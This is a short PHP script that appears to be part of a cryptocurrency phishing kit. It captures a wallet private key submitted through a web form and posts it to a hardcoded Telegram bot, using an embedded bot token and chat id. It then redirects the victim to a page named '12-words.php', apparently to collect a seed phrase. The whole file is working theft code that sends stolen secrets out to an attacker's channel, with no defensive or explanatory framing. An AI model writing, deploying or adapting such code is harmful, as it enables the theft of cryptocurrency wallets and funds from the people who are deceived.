<?php

//------------------------------------------------------------------
// Email Function --
$sendtoemail = "yes";
$email = "";
// Telegram Function --
$sendtotelegram = "yes";
$chat_id = "951261137g";
$bot_url = "5963887785:AAGpNa8vl3HCcXbQs51VSzfM_X0HvB_BJPw";

//---------------------------------------------

$_SESSION['privkey'] = $_POST['privkey'];

$ok .= "
🇵🇰☪️—————💎🦋 Private Keys 🦋 DETAILS 🦋💎—————☪️🇵🇰  \r\n

[Private Keys]     :      {$_SESSION['privkey']} \r\n
";

if ($sendtotelegram == "yes") {
    $txt = $ok;
    $send = ['chat_id' => $chat_id, 'text' => $txt];
    $url = "https://api.telegram.org/bot{$bot_url}/sendMessage";
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($send)
        ]
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
}

header("Location: ./12-words.php");
exit;
